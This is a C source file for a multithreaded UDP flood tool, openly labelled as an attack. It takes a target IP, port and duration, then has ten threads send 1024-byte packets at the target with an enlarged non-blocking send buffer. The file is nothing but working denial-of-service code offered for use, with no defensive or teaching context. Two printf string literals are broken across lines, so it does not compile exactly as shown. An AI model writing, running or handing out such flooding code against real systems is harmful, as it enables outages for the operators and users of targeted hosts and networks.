#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>

#define MAX_THREADS 10   // Controlled thread count for stability
#define PAYLOAD_SIZE 1024  // Optimal payload size for most networks
#define RATE_LIMIT 10000  // Max packets per second per thread

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Function to create a non-blocking UDP socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    // Set socket to non-blocking mode
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Increase send buffer size for better performance
    int sndbuf = 1024 * 1024;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    return sock;
}

// UDP Flooding function with rate limiting
void *udp_flood(void *params) {
    AttackParams *attack = (AttackParams *)params;
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(attack->port);
    inet_pton(AF_INET, attack->ip, &target.sin_addr);

    int sock = create_socket();
    if (sock < 0) return NULL;

    char packet[PAYLOAD_SIZE];
    memset(packet, 'A', PAYLOAD_SIZE); // Dummy payload
    struct timespec sleep_time = {0, 1000000000 / RATE_LIMIT}; // 1 second / RATE_LIMIT

    time_t start = time(NULL);
    while (time(NULL) - start < attack->duration) {
        sendto(sock, packet, PAYLOAD_SIZE, 0, (struct sockaddr *)&target, sizeof(target));
        nanosleep(&sleep_time, NULL); // Rate limiting
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <Port> <Duration>
", argv[0]);
        return EXIT_FAILURE;
    }

    AttackParams attack;
    strncpy(attack.ip, argv[1], 15);
    attack.port = atoi(argv[2]);
    attack.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&threads[i], NULL, udp_flood, &attack);
    }

    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("UDP flood attack completed.
");
    return EXIT_SUCCESS;
}
